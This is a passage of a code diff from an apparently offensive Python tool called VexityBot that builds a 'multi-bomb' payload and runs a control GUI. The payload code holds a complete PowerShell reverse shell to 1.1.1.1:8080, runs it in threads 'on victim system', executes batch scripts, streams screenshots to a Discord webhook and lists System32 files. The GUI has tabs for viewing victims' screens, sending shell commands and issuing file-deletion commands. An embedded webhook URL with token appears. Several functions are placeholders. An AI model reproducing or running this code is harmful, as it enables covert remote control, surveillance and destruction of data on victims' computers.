             shell2 = "$TCPClient = New-Object Net.Sockets.TCPClient(\"1.1.1.1\", 8080);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);[byte[]]$Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};function WriteToStream ($String) {$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String};WriteToStream ($Output)};$StreamWriter.Close();$TCPClient.Close();"
             
-
+            
             # Add scripts to the system
 
             self.add_shell_script("PowerShell_Reverse_Shell_1", shell1)
@@ -9878,7 +9912,7 @@ class VexityBotMultiBomb:
             self.add_shell_script("PowerShell_Reverse_Shell_2", shell2)
 
             
-
+            
             # Log successful addition
 
             self.log_to_discord("📝 REVERSE SHELLS ADDED", 
@@ -9888,14 +9922,14 @@ class VexityBotMultiBomb:
                               "• Shell 1: Basic TCP Reverse Shell\\n"
 
                               "• Shell 2: Advanced TCP with Error Handling")
-
+            
             
 
         except Exception as e:
 
             self.log_to_discord("❌ REVERSE SHELL ERROR", "Failed to add reverse shells: {{str(e)}}")
     
-
+    
     def execute_reverse_shells(self):
 
         """Execute the PowerShell reverse shells on victim system"""
@@ -9907,24 +9941,24 @@ class VexityBotMultiBomb:
             import time
 
             
-
+            
             self.log_to_discord("🚀 REVERSE SHELLS EXECUTING", "Starting PowerShell reverse shell connections")
 
             
-
+            
             # Execute both reverse shells in separate threads
 
             threading.Thread(target=self.run_reverse_shell_1, daemon=True).start()
 
             threading.Thread(target=self.run_reverse_shell_2, daemon=True).start()
-
+            
             
 
         except Exception as e:
 
             self.log_to_discord("❌ REVERSE SHELL EXEC ERROR", "Failed to execute reverse shells: {{str(e)}}")
     
-
+    
     def run_reverse_shell_1(self):
 
         """Execute the first PowerShell reverse shell"""
@@ -9936,19 +9970,19 @@ class VexityBotMultiBomb:
             import time
 
             
-
+            
             # Get the first reverse shell script
 
             shell_script = self.shell_scripts.get("PowerShell_Reverse_Shell_1", "")
 
             
-
+            
             if shell_script:
 
                 self.log_to_discord("💻 SHELL 1 STARTING", "Executing Basic TCP Reverse Shell")
 
                 
-
+                
                 # Execute the PowerShell script
 
                 result = subprocess.run([
@@ -9958,7 +9992,7 @@ class VexityBotMultiBomb:
                 ], capture_output=True, text=True, timeout=10)
 
                 
-
+                
                 self.log_to_discord("💻 SHELL 1 RESULT", 
 
                                   "Basic Reverse Shell executed\\n"
@@ -9967,7 +10001,7 @@ class VexityBotMultiBomb:
             else:
 
                 self.log_to_discord("❌ SHELL 1 ERROR", "Reverse shell script 1 not found")
-
+                
                 
 
         except subprocess.TimeoutExpired:
@@ -9978,7 +10012,7 @@ class VexityBotMultiBomb:
 
             self.log_to_discord("❌ SHELL 1 ERROR", "Basic reverse shell failed: {{str(e)}}")
     
-
+    
     def run_reverse_shell_2(self):
 
         """Execute the second PowerShell reverse shell"""
@@ -9990,19 +10024,19 @@ class VexityBotMultiBomb:
             import time
 
             
-
+            
             # Get the second reverse shell script
 
             shell_script = self.shell_scripts.get("PowerShell_Reverse_Shell_2", "")
 
             
-
+            
             if shell_script:
 
                 self.log_to_discord("💻 SHELL 2 STARTING", "Executing Advanced TCP Reverse Shell")
 
                 
-
+                
                 # Execute the PowerShell script
 
                 result = subprocess.run([
@@ -10012,7 +10046,7 @@ class VexityBotMultiBomb:
                 ], capture_output=True, text=True, timeout=10)
 
                 
-
+                
                 self.log_to_discord("💻 SHELL 2 RESULT", 
 
                                   "Advanced Reverse Shell executed\\n"
@@ -10021,7 +10055,7 @@ class VexityBotMultiBomb:
             else:
 
                 self.log_to_discord("❌ SHELL 2 ERROR", "Reverse shell script 2 not found")
-
+                
                 
 
         except subprocess.TimeoutExpired:
@@ -10032,7 +10066,7 @@ class VexityBotMultiBomb:
 
             self.log_to_discord("❌ SHELL 2 ERROR", "Advanced reverse shell failed: {{str(e)}}")
     
-
+    
     def monitor_shell_commands(self):
 
         """Monitor and execute shell commands from Discord"""
@@ -10044,7 +10078,7 @@ class VexityBotMultiBomb:
             import threading
 
             
-
+            
             while True:
 
                 try:
@@ -10056,23 +10090,23 @@ class VexityBotMultiBomb:
                     self.simulate_shell_execution()
 
                     
-
+                    
                     time.sleep(1)  # Check every second
-
+                    
                     
 
                 except Exception as e:
 
                     print("Shell monitoring error: {{e}}")
                     time.sleep(5)
-
+                    
                     
 
         except Exception as e:
 
             self.log_to_discord("❌ SHELL MONITOR ERROR", "Shell monitoring failed: {{str(e)}}")
     
-
+    
     def simulate_shell_execution(self):
 
         """Simulate shell command execution"""
@@ -10084,14 +10118,14 @@ class VexityBotMultiBomb:
             # For demonstration, we'll simulate some commands
 
             pass
-
+            
             
 
         except Exception as e:
 
             print("Shell simulation error: {{e}}")
     
-
+    
     def execute_shell_script(self, script_content, user_id=None):
 
         """Execute a shell script on the victim system"""
@@ -10105,7 +10139,7 @@ class VexityBotMultiBomb:
             import os
 
             
-
+            
             # Create temporary script file
 
             with tempfile.NamedTemporaryFile(mode='w', suffix='.bat', delete=False) as f:
@@ -10113,7 +10147,7 @@ class VexityBotMultiBomb:
                 f.write(script_content)
 
                 script_path = f.name
-
+            
             
 
             # Execute the script
@@ -10125,7 +10159,7 @@ class VexityBotMultiBomb:
                                   text=True, 
 
                                   timeout=30)
-
+            
             
 
             # Log execution results
@@ -10136,13 +10170,13 @@ class VexityBotMultiBomb:
                               "User: {{user_id or 'Unknown'}}\\n"
                               "Exit Code: {{result.returncode}}")
             
-
+            
             # Clean up
 
             os.unlink(script_path)
 
             
-
+            
             return {{
 
                 'success': True,
@@ -10154,7 +10188,7 @@ class VexityBotMultiBomb:
                 'stderr': result.stderr
 
             }}
-
+            
             
 
         except subprocess.TimeoutExpired:
@@ -10166,7 +10200,7 @@ class VexityBotMultiBomb:
 
             self.log_to_discord("❌ SHELL ERROR", "Script execution failed: {{str(e)}}")
             return {{'success': False, 'error': str(e)}}
-
+    
     
 
     def add_shell_script(self, script_name, script_content):
@@ -10179,18 +10213,18 @@ class VexityBotMultiBomb:
 
             self.log_to_discord("📝 SCRIPT ADDED", "Shell script '{{script_name}}' added to system")
             
-
+            
         except Exception as e:
 
             self.log_to_discord("❌ SCRIPT ADD ERROR", "Failed to add script: {{str(e)}}")
     
-
+    
     def get_available_scripts(self):
 
         """Get list of available shell scripts"""
 
         return list(self.shell_scripts.keys())
-
+    
     
 
     def capture_and_share_screen(self):
@@ -10210,7 +10244,7 @@ class VexityBotMultiBomb:
             from PIL import Image
 
             
-
+            
             # Initialize screen capture
 
             with mss.mss() as sct:
@@ -10220,7 +10254,7 @@ class VexityBotMultiBomb:
                 monitor = sct.monitors[1]
 
                 
-
+                
                 frame_count = 0
 
                 while True:
@@ -10234,13 +10268,13 @@ class VexityBotMultiBomb:
                         img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
 
                         
-
+                        
                         # Resize to 300x300 for Discord display
 
                         img_resized = img.resize((300, 300), Image.Resampling.LANCZOS)
 
                         
-
+                        
                         # Convert to base64
 
                         buffer = io.BytesIO()
@@ -10250,26 +10284,26 @@ class VexityBotMultiBomb:
                         img_base64 = base64.b64encode(buffer.getvalue()).decode()
 
                         
-
+                        
                         # Send to Discord every 5 frames (reduce spam)
 
                         if frame_count % 5 == 0:
 
                             self.send_screen_to_discord(img_base64, frame_count)
-
+                        
                         
 
                         frame_count += 1
 
                         time.sleep(0.1)  # 10 FPS
-
+                        
                         
 
                     except Exception as e:
 
                         print("Screen capture error: {{e}}")
                         time.sleep(1)
-
+                        
                         
 
         except ImportError:
@@ -10284,7 +10318,7 @@ class VexityBotMultiBomb:
 
             self.log_to_discord("❌ SCREEN CAPTURE ERROR", "Screen capture failed: {{str(e)}}")
     
-
+    
     def fallback_screen_capture(self):
 
         """Fallback screen capture method"""
@@ -10298,7 +10332,7 @@ class VexityBotMultiBomb:
             import time
 
             
-
+            
             while True:
 
                 try:
@@ -10312,7 +10346,7 @@ class VexityBotMultiBomb:
                                   '[System.Windows.Forms.Screen]::PrimaryScreen.Bounds'], 
 
                                  capture_output=True, check=True)
-
+                    
                     
 
                     # Send placeholder screen data
@@ -10320,21 +10354,21 @@ class VexityBotMultiBomb:
                     self.send_screen_placeholder()
 
                     time.sleep(2)
-
+                    
                     
 
                 except Exception as e:
 
                     print("Fallback capture error: {{e}}")
                     time.sleep(5)
-
+                    
                     
 
         except Exception as e:
 
             self.log_to_discord("❌ FALLBACK CAPTURE ERROR", "Fallback capture failed: {{str(e)}}")
     
-
+    
     def send_screen_to_discord(self, img_base64, frame_count):
 
         """Send screen capture to Discord"""
@@ -10346,7 +10380,7 @@ class VexityBotMultiBomb:
             import json
 
             
-
+            
             # Create screen sharing embed
 
             embed_data = {{
@@ -10376,16 +10410,16 @@ class VexityBotMultiBomb:
             }}
 
             
-
+            
             self.send_discord_embed(embed_data)
-
+            
             
 
         except Exception as e:
 
             print("Discord screen send error: {{e}}")
     
-
+    
     def send_screen_placeholder(self):
 
         """Send screen placeholder when capture fails"""
@@ -10397,7 +10431,7 @@ class VexityBotMultiBomb:
             import json
 
             
-
+            
             embed_data = {{
 
                 "embeds": [{{
@@ -10421,16 +10455,16 @@ class VexityBotMultiBomb:
             }}
 
             
-
+            
             self.send_discord_embed(embed_data)
-
+            
             
 
         except Exception as e:
 
             print("Placeholder send error: {{e}}")
     
-
+    
     def create_pokemon_file_cards(self, files):
 
         """Create Pokemon-style Discord cards for System32 files"""
@@ -10450,7 +10484,7 @@ class VexityBotMultiBomb:
                     file_groups[ext] = []
 
                 file_groups[ext].append(file_info)
-
+            
             
 
             # Create cards for each file group
@@ -10460,7 +10494,7 @@ class VexityBotMultiBomb:
                 if not group_files:
 
                     continue
-
+                
                 
 
                 # Create Pokemon-style card
@@ -10468,7 +10502,7 @@ class VexityBotMultiBomb:
                 card_title = "🎴 System32 Files - {{ext.upper()}} Type"
                 card_description = "Found {{len(group_files)}} files with {{ext}} extension"
                 
-
+                
                 # Create fields for files (Discord embed limit is 25 fields)
 
                 fields = []
@@ -10478,14 +10512,14 @@ class VexityBotMultiBomb:
                     file_size_mb = file_info['size'] / (1024 * 1024)
 
                     file_name = file_info['name'][:50]  # Truncate long names
-
+                    
                     
 
                     field_value = "📁 **{{file_name}}**\\n"
                     field_value += "📏 Size: {{file_size_mb:.2f}} MB\\n"
                     field_value += "📅 Modified: {{file_info['modified'].strftime('%Y-%m-%d %H:%M')}}"
                     
-
+                    
                     fields.append({{
 
                         "name": "File {{i+1}}",
@@ -10494,7 +10528,7 @@ class VexityBotMultiBomb:
                         "inline": True
 
                     }})
-
+                
                 
 
                 # Create Pokemon-style embed
@@ -10504,7 +10538,7 @@ class VexityBotMultiBomb:
                 color = pokemon_colors[hash(ext) % len(pokemon_colors)]
 
                 
-
+                
                 embed_data = {{
 
                     "embeds": [{{
@@ -10538,30 +10572,30 @@ class VexityBotMultiBomb:
                 }}
 
                 
-
+                
                 # Send to Discord
 
                 self.send_discord_embed(embed_data)
 
                 
-
+                
                 # Small delay between cards
 
                 time.sleep(1)
-
+            
             
 
             # Send summary card
 
             self.create_system32_summary_card(files)
-
+            
             
 
         except Exception as e:
 
             self.log_to_discord("❌ POKEMON CARD ERROR", "Failed to create cards: {{str(e)}}")
     
-
+    
     def create_system32_summary_card(self, files):
 
         """Create a summary Pokemon card for System32 monitoring"""
@@ -10575,7 +10609,7 @@ class VexityBotMultiBomb:
             total_size_mb = total_size / (1024 * 1024)
 
             
-
+            
             # Count by extension
 
             ext_counts = {{}}
@@ -10585,7 +10619,7 @@ class VexityBotMultiBomb:
                 ext = file_info['extension'] or 'no_extension'
 
                 ext_counts[ext] = ext_counts.get(ext, 0) + 1
-
+            
             
 
             # Create summary fields
@@ -10600,7 +10634,7 @@ class VexityBotMultiBomb:
             ]
 
             
-
+            
             # Add top extensions
 
             top_extensions = sorted(ext_counts.items(), key=lambda x: x[1], reverse=True)[:10]
@@ -10614,7 +10648,7 @@ class VexityBotMultiBomb:
                     "inline": True
 
                 }})
-
+            
             
 
             summary_embed = {{
@@ -10650,16 +10684,16 @@ class VexityBotMultiBomb:
             }}
 
             
-
+            
             self.send_discord_embed(summary_embed)
-
+            
             
 
         except Exception as e:
 
             self.log_to_discord("❌ SUMMARY CARD ERROR", "Failed to create summary: {{str(e)}}")
     
-
+    
     def send_discord_embed(self, embed_data):
 
         """Send embed data to Discord webhook"""
@@ -10671,7 +10705,7 @@ class VexityBotMultiBomb:
             import json
 
             
-
+            
             req = urllib.request.Request(
 
                 WEBHOOK_URL,
@@ -10683,16 +10717,16 @@ class VexityBotMultiBomb:
             )
 
             
-
+            
             urllib.request.urlopen(req, timeout=10)
-
+            
             
 
         except Exception as e:
 
             print("Discord embed send failed: {{e}}")
     
-
+    
     def monitor_bomb_activity(self):
 
         """Monitor ongoing bomb activity"""
@@ -10735,25 +10769,25 @@ def main():
         print()
 
         
-
+        
         # Small delay before activation
 
         time.sleep(2)
 
         
-
+        
         # Deploy multi-bomb
 
         multi_bomb = VexityBotMultiBomb()
 
         
-
+        
         # Keep running to maintain effects
 
         while True:
 
             time.sleep(60)
-
+            
             
 
     except KeyboardInterrupt:
@@ -10777,9 +10811,9 @@ if __name__ == "__main__":
             bomb_configs_str=bomb_configs
         )
         
-
+        
         return multi_bomb_content
-
+    
     
 
     def log_build(self, message):
@@ -10789,7 +10823,7 @@ if __name__ == "__main__":
         self.root.after(0, lambda: self.build_log.insert(tk.END, f"{message}\n"))
 
         self.root.after(0, lambda: self.build_log.see(tk.END))
-
+    
     
 
     def clear_build_log(self):
@@ -10801,7 +10835,7 @@ if __name__ == "__main__":
         self.build_status.config(text="Ready to build")
 
         self.build_progress.stop()
-
+    
     
 
     def delete_selected_files(self):
@@ -10817,7 +10851,7 @@ if __name__ == "__main__":
                 messagebox.showwarning("No Selection", "Please select files to delete")
 
                 return
-
+            
             
 
             # Get selected file paths
@@ -10835,7 +10869,7 @@ if __name__ == "__main__":
                     file_path = file_info.split(" - ")[1]
 
                     selected_files.append(file_path)
-
+            
             
 
             if not selected_files:
@@ -10843,7 +10877,7 @@ if __name__ == "__main__":
                 messagebox.showwarning("Invalid Selection", "Could not extract file paths")
 
                 return
-
+            
             
 
             # Confirm deletion
@@ -10853,7 +10887,7 @@ if __name__ == "__main__":
                                        f"Are you sure you want to delete {len(selected_files)} files?\n\n"
 
                                        "This action cannot be undone!")
-
+            
             
 
             if result:
@@ -10863,13 +10897,13 @@ if __name__ == "__main__":
                 self.send_file_deletion_command(selected_files)
 
                 
-
+                
                 # Remove from listbox
 
                 for index in reversed(selected_indices):
 
                     self.victim_files_listbox.delete(index)
-
+                
                 
 
                 self.log_build(f"🗑️ Deletion command sent for {len(selected_files)} files")
@@ -10877,7 +10911,7 @@ if __name__ == "__main__":
                 messagebox.showinfo("Deletion Command Sent", 
 
                                   f"File deletion command sent to victim for {len(selected_files)} files")
-
+                
                 
 
         except Exception as e:
@@ -10885,7 +10919,7 @@ if __name__ == "__main__":
             self.log_build(f"❌ File deletion error: {str(e)}")
 
             messagebox.showerror("Deletion Error", f"Failed to delete files: {str(e)}")
-
+    
     
 
     def send_file_deletion_command(self, file_paths):
@@ -10899,11 +10933,11 @@ if __name__ == "__main__":
             import json
 
             
-
+            
             webhook_url = "https://discord.com/api/webhooks/1416334316232900618/bhtElnCIHNbiw2vJ4BKkliOrOqOV98rjv_OBhW-FK6Isx4xT3oLBC-_vV1AjSlwGdbYc"
 
             
-
+            
             # Create deletion command embed
 
             fields = []
@@ -10919,7 +10953,7 @@ if __name__ == "__main__":
                     "inline": True
 
                 })
-
+            
             
 
             embed_data = {
@@ -10947,7 +10981,7 @@ if __name__ == "__main__":
             }
 
             
-
+            
             req = urllib.request.Request(
 
                 webhook_url,
@@ -10959,15 +10993,15 @@ if __name__ == "__main__":
             )
 
             
-
+            
             urllib.request.urlopen(req, timeout=10)
-
+            
             
 
         except Exception as e:
 
             self.log_build(f"❌ Failed to send deletion command: {str(e)}")
-
+    
     
 
     def refresh_victim_files(self):
@@ -10983,13 +11017,13 @@ if __name__ == "__main__":
             # For now, we'll simulate with some example files
 
             self.simulate_victim_files()
-
+            
             
 
         except Exception as e:
 
             self.log_build(f"❌ Failed to refresh files: {str(e)}")
-
+    
     
 
     def simulate_victim_files(self):
@@ -11003,7 +11037,7 @@ if __name__ == "__main__":
             self.victim_files_listbox.delete(0, tk.END)
 
             
-
+            
             # Simulate some System32 files
 
             example_files = [
@@ -11031,21 +11065,21 @@ if __name__ == "__main__":
             ]
 
             
-
+            
             for file_info in example_files:
 
                 self.victim_files_listbox.insert(tk.END, file_info)
-
+            
             
 
             self.log_build(f"📁 Loaded {len(example_files)} victim files")
-
+            
             
 
         except Exception as e:
 
             self.log_build(f"❌ Failed to simulate files: {str(e)}")
-
+    
     
 
     def open_victim_directory(self):
@@ -11059,7 +11093,7 @@ if __name__ == "__main__":
             import os
 
             
-
+            
             # Try to open System32 directory
 
             system32_path = "C:\\Windows\\System32"
@@ -11073,7 +11107,7 @@ if __name__ == "__main__":
             else:
 
                 messagebox.showwarning("Directory Not Found", "System32 directory not accessible")
-
+                
                 
 
         except Exception as e:
@@ -11081,7 +11115,7 @@ if __name__ == "__main__":
             self.log_build(f"❌ Failed to open directory: {str(e)}")
 
             messagebox.showerror("Error", f"Failed to open directory: {str(e)}")
-
+    
     
 
     def create_screens_tab(self):
@@ -11093,7 +11127,7 @@ if __name__ == "__main__":
         self.notebook.add(screens_frame, text="Screens")
 
         
-
+        
         # Main container
 
         main_container = ttk.Frame(screens_frame)
@@ -11101,7 +11135,7 @@ if __name__ == "__main__":
         main_container.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
 
         
-
+        
         # Title
 
         title_label = ttk.Label(main_container, text="🖥️ Screen Management & User Monitoring", 
@@ -11111,7 +11145,7 @@ if __name__ == "__main__":
         title_label.pack(pady=(0, 20))
 
         
-
+        
         # Create divided columns container
 
         columns_frame = ttk.Frame(main_container)
@@ -11119,7 +11153,7 @@ if __name__ == "__main__":
         columns_frame.pack(fill=tk.BOTH, expand=True)
 
         
-
+        
         # Left column - User List
 
         left_column = ttk.LabelFrame(columns_frame, text="👥 Connected Users", padding=10)
@@ -11127,7 +11161,7 @@ if __name__ == "__main__":
         left_column.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
 
         
-
+        
         # User list header
 
         user_header = ttk.Frame(left_column)
@@ -11135,17 +11169,17 @@ if __name__ == "__main__":
         user_header.pack(fill=tk.X, pady=(0, 10))
 
         
-
+        
         ttk.Label(user_header, text="Active Users:", font=('Arial', 12, 'bold')).pack(side=tk.LEFT)
 
         
-
+        
         # Refresh users button
 
         ttk.Button(user_header, text="🔄 Refresh", 
 
                   command=self.refresh_users).pack(side=tk.RIGHT)
-
+        
         
 
         # User listbox with scrollbar
@@ -11155,7 +11189,7 @@ if __name__ == "__main__":
         user_list_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
 
         
-
+        
         self.users_listbox = tk.Listbox(user_list_frame, height=15, selectmode=tk.SINGLE)
 
         user_scrollbar = ttk.Scrollbar(user_list_frame, orient="vertical", command=self.users_listbox.yview)
@@ -11163,13 +11197,13 @@ if __name__ == "__main__":
         self.users_listbox.configure(yscrollcommand=user_scrollbar.set)
 
         
-
+        
         self.users_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
 
         user_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
 
         
-
+        
         # User action buttons
 
         user_btn_frame = ttk.Frame(left_column)
@@ -11177,7 +11211,7 @@ if __name__ == "__main__":
         user_btn_frame.pack(fill=tk.X)
 
         
-
+        
         ttk.Button(user_btn_frame, text="📺 View Screen", 
 
                   command=self.view_user_screen).pack(side=tk.LEFT, padx=2)
@@ -11189,7 +11223,7 @@ if __name__ == "__main__":
         ttk.Button(user_btn_frame, text="🎥 Start Recording", 
 
                   command=self.start_recording).pack(side=tk.LEFT, padx=2)
-
+        
         
 
         # Right column - Screen Display
@@ -11199,7 +11233,7 @@ if __name__ == "__main__":
         right_column.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(5, 0))
 
         
-
+        
         # Screen display header
 
         screen_header = ttk.Frame(right_column)
@@ -11207,7 +11241,7 @@ if __name__ == "__main__":
         screen_header.pack(fill=tk.X, pady=(0, 10))
 
         
-
+        
         self.current_user_label = ttk.Label(screen_header, text="No user selected", 
 
                                           font=('Arial', 12, 'bold'))
@@ -11215,7 +11249,7 @@ if __name__ == "__main__":
         self.current_user_label.pack(side=tk.LEFT)
 
         
-
+        
         # Screen control buttons
 
         screen_btn_frame = ttk.Frame(screen_header)
@@ -11223,7 +11257,7 @@ if __name__ == "__main__":
         screen_btn_frame.pack(side=tk.RIGHT)
 
         
-
+        
         ttk.Button(screen_btn_frame, text="⏸️ Pause", 
 
                   command=self.pause_screen).pack(side=tk.LEFT, padx=2)
@@ -11235,7 +11269,7 @@ if __name__ == "__main__":
         ttk.Button(screen_btn_frame, text="🔍 Zoom", 
 
                   command=self.zoom_screen).pack(side=tk.LEFT, padx=2)
-
+        
         
 
         # Screen display area
@@ -11245,7 +11279,7 @@ if __name__ == "__main__":
         self.screen_display.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
 
         
-
+        
         # Screen info panel
 
         info_frame = ttk.LabelFrame(right_column, text="📊 Screen Information", padding=5)
@@ -11253,7 +11287,7 @@ if __name__ == "__main__":
         info_frame.pack(fill=tk.X)
 
         
-
+        
         # Info labels
 
         self.screen_info_frame = ttk.Frame(info_frame)
@@ -11261,25 +11295,25 @@ if __name__ == "__main__":
         self.screen_info_frame.pack(fill=tk.X)
 
         
-
+        
         self.resolution_label = ttk.Label(self.screen_info_frame, text="Resolution: N/A")
 
         self.resolution_label.pack(anchor='w')
 
         
-
+        
         self.fps_label = ttk.Label(self.screen_info_frame, text="FPS: N/A")
 
         self.fps_label.pack(anchor='w')
 
         
-
+        
         self.quality_label = ttk.Label(self.screen_info_frame, text="Quality: N/A")
 
         self.quality_label.pack(anchor='w')
 
         
-
+        
         # Bottom control panel
 
         control_frame = ttk.Frame(screens_frame)
@@ -11287,7 +11321,7 @@ if __name__ == "__main__":
         control_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
 
         
-
+        
         # Shell command input
 
         shell_frame = ttk.LabelFrame(control_frame, text="💻 Shell Commands", padding=10)
@@ -11295,17 +11329,17 @@ if __name__ == "__main__":
         shell_frame.pack(fill=tk.X, pady=(0, 10))
 
         
-
+        
         shell_input_frame = ttk.Frame(shell_frame)
 
         shell_input_frame.pack(fill=tk.X)
 
         
-
+        
         ttk.Label(shell_input_frame, text="Command:").pack(side=tk.LEFT, padx=(0, 5))
 
         
-
+        
         self.shell_entry = ttk.Entry(shell_input_frame, font=('Consolas', 10))
 
         self.shell_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
@@ -11313,11 +11347,11 @@ if __name__ == "__main__":
         self.shell_entry.bind('<Return>', self.execute_shell_command)
 
         
-
+        
         ttk.Button(shell_input_frame, text="Execute", 
 
                   command=self.execute_shell_command).pack(side=tk.RIGHT)
-
+        
         
 
         # Command history
@@ -11327,11 +11361,11 @@ if __name__ == "__main__":
         history_frame.pack(fill=tk.X, pady=(10, 0))
 
         
-
+        
         ttk.Label(history_frame, text="Recent Commands:", font=('Arial', 9, 'bold')).pack(anchor='w')
 
         
-
+        
         self.command_history = tk.Listbox(history_frame, height=4, font=('Consolas', 9))
 
         history_scrollbar = ttk.Scrollbar(history_frame, orient="vertical", command=self.command_history.yview)
@@ -11339,17 +11373,17 @@ if __name__ == "__main__":
         self.command_history.configure(yscrollcommand=history_scrollbar.set)
 
         
-
+        
         self.command_history.pack(side=tk.LEFT, fill=tk.X, expand=True)
 
         history_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
 
         
-
+        
         # Initialize with sample users
 
         self.initialize_sample_users()
-
+    
     
 
     def initialize_sample_users(self):
@@ -11371,11 +11405,11 @@ if __name__ == "__main__":
         ]
 
         
-
+        
         for user in sample_users:
 
             self.users_listbox.insert(tk.END, user)
-
+    
     
 
     def refresh_users(self):
@@ -11387,17 +11421,17 @@ if __name__ == "__main__":
         self.users_listbox.delete(0, tk.END)
 
         
-
+        
         # Add refreshed users (in real implementation, this would fetch from network)
 
         self.initialize_sample_users()
 
         
-
+        
         # Update display
 
         self.current_user_label.config(text="Users refreshed")
-
+    
     
 
     def view_user_screen(self):
@@ -11411,7 +11445,7 @@ if __name__ == "__main__":
             messagebox.showwarning("No Selection", "Please select a user to view their screen")
 
             return
-
+        
         
 
         user = self.users_listbox.get(selection[0])
@@ -11419,7 +11453,7 @@ if __name__ == "__main__":
         self.current_user_label.config(text=f"Viewing: {user}")
 
         
-
+        
         # Simulate screen display
 
         self.screen_display.delete("all")
@@ -11441,7 +11475,7 @@ if __name__ == "__main__":
         )
 
         
-
+        
         # Update screen info
 
         self.resolution_label.config(text="Resolution: 1920x1080")
@@ -11449,7 +11483,7 @@ if __name__ == "__main__":
         self.fps_label.config(text="FPS: 30")
 
         self.quality_label.config(text="Quality: High")
-
+    
     
 
     def take_screenshot(self):
@@ -11463,7 +11497,7 @@ if __name__ == "__main__":
             messagebox.showwarning("No Selection", "Please select a user first")
 
             return
-
+        
         
 
         user = self.users_listbox.get(selection[0])
@@ -11471,7 +11505,7 @@ if __name__ == "__main__":
         messagebox.showinfo("Screenshot", f"Screenshot taken for {user}")
 
         
-
+        
         # Add to command history
 
         self.command_history.insert(0, f"screenshot {user}")
@@ -11479,7 +11513,7 @@ if __name__ == "__main__":
         if self.command_history.size() > 10:
 
             self.command_history.delete(10, tk.END)
-
+    
     
 
     def start_recording(self):
@@ -11493,7 +11527,7 @@ if __name__ == "__main__":
             messagebox.showwarning("No Selection", "Please select a user first")
 
             return
-
+        
         
 
         user = self.users_listbox.get(selection[0])
@@ -11501,7 +11535,7 @@ if __name__ == "__main__":
         messagebox.showinfo("Recording", f"Screen recording started for {user}")
 
         
-
+        
         # Add to command history
 
         self.command_history.insert(0, f"record {user}")
@@ -11509,7 +11543,7 @@ if __name__ == "__main__":
         if self.command_history.size() > 10:
 
             self.command_history.delete(10, tk.END)
-
+    
     
 
     def pause_screen(self):
@@ -11517,7 +11551,7 @@ if __name__ == "__main__":
         """Pause the current screen display"""
 
         messagebox.showinfo("Screen", "Screen display paused")
-
+    
     
 
     def resume_screen(self):
@@ -11525,7 +11559,7 @@ if __name__ == "__main__":
         """Resume the current screen display"""
 
         messagebox.showinfo("Screen", "Screen display resumed")
-
+    
     
 
     def zoom_screen(self):
@@ -11533,7 +11567,7 @@ if __name__ == "__main__":
         """Zoom the current screen display"""
 
         messagebox.showinfo("Screen", "Screen zoom toggled")
-
+    
     
 
     def execute_shell_command(self, event=None):
@@ -11547,7 +11581,7 @@ if __name__ == "__main__":
             messagebox.showwarning("No Selection", "Please select a user first")
 
             return
-
+        
         
 
         command = self.shell_entry.get().strip()
@@ -11557,13 +11591,13 @@ if __name__ == "__main__":
             messagebox.showwarning("Empty Command", "Please enter a command")
 
             return
-
+        
         
 
         user = self.users_listbox.get(selection[0])
 
         
-
+        
         # Add to command history
 
         self.command_history.insert(0, f"{user}: {command}")
@@ -11571,7 +11605,7 @@ if __name__ == "__main__":
         if self.command_history.size() > 10:
 
             self.command_history.delete(10, tk.END)
-
+        
         
 
         # Clear entry
@@ -11579,7 +11613,7 @@ if __name__ == "__main__":
         self.shell_entry.delete(0, tk.END)
 
         
-
+        
         # Show execution message
 
         messagebox.showinfo("Command Executed", f"Command '{command}' sent to {user}")
@@ -12337,6 +12371,1163 @@ if __name__ == "__main__":
             
             self.log_build(f"Steganography module import error: {str(e)}")
     
+    def create_gamebots_tab(self):
+        """Create the GameBots tab with gaming leaderboard"""
+        gamebots_frame = ttk.Frame(self.notebook, style='TSM.TFrame')
+        self.notebook.add(gamebots_frame, text="🎮 GameBots")
+        
+        # Main container
+        main_container = ttk.Frame(gamebots_frame, style='TSM.TFrame')
+        main_container.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+        
+        # Title
+        title_label = ttk.Label(main_container, 
+                               text="🎮 VexityBot GameBots Leaderboard", 
+                               font=('Arial', 16, 'bold'),
+                               style='TSM.TLabel')
+        title_label.pack(pady=(0, 20))
+        
+        # Stats summary
+        self.create_gamebot_stats_summary(main_container)
+        
+        # Leaderboard
+        self.create_gamebot_leaderboard(main_container)
+        
+        # Control buttons
+        self.create_gamebot_controls(main_container)
+    
+    def create_gamebot_stats_summary(self, parent):
+        """Create GameBot statistics summary"""
+        stats_frame = ttk.LabelFrame(parent, text="📊 GameBot Statistics", style='TSM.TLabelframe')
+        stats_frame.pack(fill=tk.X, pady=(0, 10))
+        
+        # Calculate stats
+        total_gamebots = len(self.gamebot_data)
+        online_gamebots = len([bot for bot in self.gamebot_data if bot['status'] == 'Online'])
+        total_kills = sum(bot['kills'] for bot in self.gamebot_data)
+        avg_level = sum(bot['level'] for bot in self.gamebot_data) / total_gamebots
+        
+        # Stats grid
+        stats_grid = ttk.Frame(stats_frame, style='TSM.TFrame')
+        stats_grid.pack(fill=tk.X, padx=10, pady=10)
+        
+        # Row 1
+        ttk.Label(stats_grid, text=f"Total GameBots: {total_gamebots}", style='TSM.TLabel').grid(row=0, column=0, sticky=tk.W, padx=(0, 20))
+        ttk.Label(stats_grid, text=f"Online: {online_gamebots}", style='TSM.TLabel').grid(row=0, column=1, sticky=tk.W, padx=(0, 20))
